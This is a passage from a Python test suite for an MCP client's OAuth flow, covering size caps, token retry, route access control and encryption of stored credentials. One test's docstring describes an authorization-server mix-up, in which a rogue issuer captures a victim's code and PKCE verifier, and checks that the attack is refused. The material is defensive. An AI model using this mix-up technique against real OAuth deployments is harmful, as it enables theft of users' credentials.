        )
    finally:
        db.close()


def test_an_endless_metadata_document_is_refused_while_it_is_read():
    """The size cap has to bite during the read, not after it.

    Reading `response.content` and measuring afterwards is not a limit: the body
    is already in memory by then, which is the whole outcome the cap exists to
    prevent. Streamed in chunks here, so a document that never ends is refused
    having buffered a bounded amount of it — and `served` proves we stopped
    early rather than consuming the lot and complaining.
    """
    chunk = b"x" * 64 * 1024
    served = {"chunks": 0}

    def endless():
        # Far more than the cap, and lazily generated: if the guard did not stop
        # the loop this would keep going.
        for _ in range(512):
            served["chunks"] += 1
            yield chunk

    transport = httpx.MockTransport(
        lambda request: httpx.Response(200, content=endless())
    )
    with httpx.Client(transport=transport) as client:
        with client.stream("GET", "https://auth.example.test/meta") as response:
            with pytest.raises(oauth.McpOAuthError, match="oversized"):
                oauth._read_json(response)

    assert served["chunks"] * len(chunk) <= oauth.MAX_METADATA_BYTES + len(chunk), (
        "the reader kept pulling after it had already exceeded the cap"
    )


def test_a_callback_is_refused_when_the_issuer_rotated_mid_flow(
    server_double, public_dns, workspace, encryption, monkeypatch
):
    """The authorization-server mix-up RFC 9207 exists to answer.

    The victim is midway through a legitimate consent at the honest issuer when
    the MCP server re-points at one the attacker runs. Resolving the
    registration by recency would post the victim's authorization code *and*
    their PKCE verifier to the attacker's token endpoint — everything needed to
    redeem that code at the honest issuer. The state row records the issuer it
    meant, so the exchange is refused instead.
    """
    rogue = "https://auth.attacker.test"
    db, server = _session_and_server(workspace)
    try:
        # The victim starts a flow against the honest issuer.
        oauth.begin_authorization(db, server, workspace["owner"].user_id, encryption)
        victim_state = (
            db.query(OAuthState)
            .filter(OAuthState.user_id == workspace["owner"].user_id)
            .one()
        )
        assert victim_state.issuer == ISSUER
        state = victim_state.state

        # The server rotates and somebody else connects, which retires the
        # registration the victim's in-flight authorize URL was built from.
        _rotate_issuer(server_double, monkeypatch, rogue)
        oauth.begin_authorization(db, server, workspace["colleague"].user_id, encryption)
        assert {row.issuer for row in db.query(McpOAuthClient).all()} == {rogue}

        with pytest.raises(oauth.McpOAuthError):
            oauth.complete_authorization(db, state, "victim-code", encryption)

        # The decisive assertion: neither the code nor the verifier was offered
        # to the issuer that replaced the one the victim consented at.
        verifier = decrypt_secret(victim_state.pkce_verifier_enc)
        to_rogue = [
            request
            for request in server_double.requests
            if request.method == "POST" and str(request.url) == f"{rogue}/token"
        ]
        assert not any(b"victim-code" in request.content for request in to_rogue)
        assert not any(
            verifier.encode() in request.content for request in to_rogue
        )
    finally:
        db.close()


# --------------------------------------------------------------------------
# The client retry


class _FakeGroup(Exception):
    """Stands in for the ExceptionGroup anyio wraps transport errors in."""

    def __init__(self, inner: BaseException) -> None:
        super().__init__("task group failed")
        self.exceptions = [inner]


def _status_error(status: int) -> httpx.HTTPStatusError:
    request = httpx.Request("POST", SERVER_URL)
    return httpx.HTTPStatusError(
        "boom", request=request, response=httpx.Response(status, request=request)
    )


def test_unauthorized_is_recognised_through_wrapping():
    assert mcp_client._is_unauthorized(_status_error(401)) is True
    assert mcp_client._is_unauthorized(_FakeGroup(_status_error(401))) is True
    wrapped = RuntimeError("connection closed")
    wrapped.__cause__ = _status_error(401)
    assert mcp_client._is_unauthorized(wrapped) is True
    assert mcp_client._is_unauthorized(_FakeGroup(_status_error(500))) is False
    assert mcp_client._is_unauthorized(RuntimeError("nope")) is False


def test_client_retries_once_with_a_freshly_acquired_token(monkeypatch):
    seen: List[Optional[str]] = []

    async def fake_session(config, timeout, action):
        seen.append(config.headers.get("Authorization"))
        if len(seen) == 1:
            raise _FakeGroup(_status_error(401))
        return [mcp_client.McpToolInfo(name="ok", description="")]

    monkeypatch.setattr(mcp_client, "_with_session", fake_session)
    config = mcp_client.ServerConfig(name="remote", transport="http", url=SERVER_URL)
    tokens_asked: List[bool] = []

    def tokens(force_refresh: bool = False) -> Optional[str]:
        tokens_asked.append(force_refresh)
        return "fresh" if force_refresh else "stale"

    result = mcp_client.list_tools(config, timeout=5.0, tokens=tokens)
    assert [tool.name for tool in result] == ["ok"]
    assert seen == ["Bearer stale", "Bearer fresh"]
    # Asked normally, then asked again with force_refresh once the 401 landed.
    assert tokens_asked == [False, True]


def test_client_surfaces_auth_required_when_no_token_can_be_had(monkeypatch):
    async def fake_session(config, timeout, action):
        raise _FakeGroup(_status_error(401))

    monkeypatch.setattr(mcp_client, "_with_session", fake_session)
    config = mcp_client.ServerConfig(name="remote", transport="http", url=SERVER_URL)
    with pytest.raises(mcp_client.McpAuthRequired):
        mcp_client.list_tools(config, timeout=5.0, tokens=lambda force=False: None)


def test_a_non_401_failure_is_not_retried(monkeypatch):
    attempts: List[int] = []

    async def fake_session(config, timeout, action):
        attempts.append(1)
        raise _FakeGroup(_status_error(500))

    monkeypatch.setattr(mcp_client, "_with_session", fake_session)
    config = mcp_client.ServerConfig(name="remote", transport="http", url=SERVER_URL)
    with pytest.raises(mcp_client.McpError):
        mcp_client.list_tools(config, timeout=5.0, tokens=lambda force=False: "tok")
    assert len(attempts) == 1


# --------------------------------------------------------------------------
# The HTTP surface


def _client_for(identity, workspace_id: Optional[str] = None):
    from conftest import TEST_BASE_URL, authenticate
    from fastapi.testclient import TestClient

    from app.main import app

    test_client = TestClient(app, base_url=TEST_BASE_URL)
    authenticate(test_client, identity)
    if workspace_id:
        # A user with more than one membership has to say which workspace they
        # are acting in; the colleague belongs to their own and to the owner's.
        test_client.headers["X-Workspace-Id"] = workspace_id
    return test_client


def test_connect_route_returns_an_authorize_url(
    server_double, public_dns, workspace, encryption
):
    api = _client_for(workspace["owner"])
    response = api.post(f"/api/mcp/servers/{workspace['server_id']}/connect")
    assert response.status_code == 200
    assert response.json()["authorize_url"].startswith(AUTHORIZE)


def test_connect_route_refuses_another_workspaces_server(
    server_double, public_dns, workspace, encryption
):
    """The colleague acting in *their own* workspace cannot name this server."""
    api = _client_for(workspace["colleague"])
    response = api.post(f"/api/mcp/servers/{workspace['server_id']}/connect")
    assert response.status_code == 404


def test_callback_route_stores_the_token_and_redirects(
    server_double, public_dns, workspace, encryption
):
    api = _client_for(workspace["owner"])
    api.post(f"/api/mcp/servers/{workspace['server_id']}/connect")
    db = SessionLocal()
    try:
        state = db.query(OAuthState).one().state
    finally:
        db.close()

    response = api.get(
        "/api/mcp/oauth/callback",
        params={"code": "auth-code-1", "state": state},
        follow_redirects=False,
    )
    assert response.status_code in (302, 307)
    assert "mcp_connected" in response.headers["location"]

    status = api.get(f"/api/mcp/servers/{workspace['server_id']}/auth").json()
    assert status["connected"] is True
    assert status["issuer"] == ISSUER

    # The colleague can see the same server row — they share the workspace — and
    # still has to connect their own account. This is the whole point of keying
    # tokens on (server, user).
    other = _client_for(workspace["colleague"], workspace["owner"].workspace_id)
    other_status = other.get(f"/api/mcp/servers/{workspace['server_id']}/auth")
    assert other_status.status_code == 200
    assert other_status.json()["connected"] is False


def test_callback_route_never_puts_the_reason_in_the_url(
    server_double, public_dns, workspace, encryption
):
    api = _client_for(workspace["owner"])
    response = api.get(
        "/api/mcp/oauth/callback",
        params={"code": "x", "state": "forged"},
        follow_redirects=False,
    )
    assert response.status_code in (302, 307)
    assert response.headers["location"].endswith("mcp_error=failed")


def test_refresh_route_reports_a_server_that_needs_auth(
    server_double, public_dns, workspace, encryption, monkeypatch
):
    from app.services.mcp import registry

    def refuse(config, **kwargs):
        raise mcp_client.McpAuthRequired("This server needs you to connect an account")

    monkeypatch.setattr(registry, "list_tools", refuse)
    api = _client_for(workspace["owner"])
    body = api.post(f"/api/mcp/servers/{workspace['server_id']}/refresh").json()
    assert body["status"] == "needs_auth"
    assert "connect" in body["last_error"].lower()


def test_disconnect_route_clears_only_the_caller(
    server_double, public_dns, workspace, encryption
):
    db, server = _session_and_server(workspace)
    try:
        _connect(db, server, workspace["owner"].user_id, encryption)
    finally:
        db.close()
    api = _client_for(workspace["owner"])
    body = api.post(f"/api/mcp/servers/{workspace['server_id']}/disconnect").json()
    assert body["connected"] is False
    db = SessionLocal()
    try:
        assert db.query(McpOAuthToken).count() == 0
    finally:
        db.close()


def test_deleting_a_server_takes_its_credentials_with_it(
    server_double, public_dns, workspace, encryption
):
    db, server = _session_and_server(workspace)
    try:
        _connect(db, server, workspace["owner"].user_id, encryption)
    finally:
        db.close()
    api = _client_for(workspace["owner"])
    assert api.delete(f"/api/mcp/servers/{workspace['server_id']}").status_code == 204
    db = SessionLocal()
    try:
        assert db.query(McpOAuthToken).count() == 0
        assert db.query(McpOAuthClient).count() == 0
    finally:
        db.close()


def test_no_route_or_error_ever_echoes_a_secret(
    server_double, public_dns, workspace, encryption
):
    """Codes, verifiers and tokens must not reach the UI or the logs."""
    api = _client_for(workspace["owner"])
    connect = api.post(f"/api/mcp/servers/{workspace['server_id']}/connect")
    db = SessionLocal()
    try:
        record = db.query(OAuthState).one()
        verifier = decrypt_secret(record.pkce_verifier_enc)
        state = record.state
    finally:
        db.close()
    assert verifier not in connect.text

    callback = api.get(
        "/api/mcp/oauth/callback",
        params={"code": "auth-code-1", "state": state},
        follow_redirects=False,
    )
    location = callback.headers["location"]
    assert "auth-code-1" not in location
    assert "access-1" not in location

    status = api.get(f"/api/mcp/servers/{workspace['server_id']}/auth").text
    assert "access-1" not in status
    assert "refresh-1" not in status


def test_stored_credentials_are_encrypted_at_rest(
    server_double, public_dns, workspace, encryption
):
    db, server = _session_and_server(workspace)
    try:
        _connect(db, server, workspace["owner"].user_id, encryption)
        row = db.query(McpOAuthToken).one()
        blob = row.access_token_enc + row.refresh_token_enc
        assert "access-1" not in blob and "refresh-1" not in blob
        assert decrypt_secret(row.refresh_token_enc) == "refresh-1"
        # And the ciphertext really is this deployment's key, not a hash.
        assert encrypt_secret("access-1") != row.access_token_enc
    finally:
        db.close()
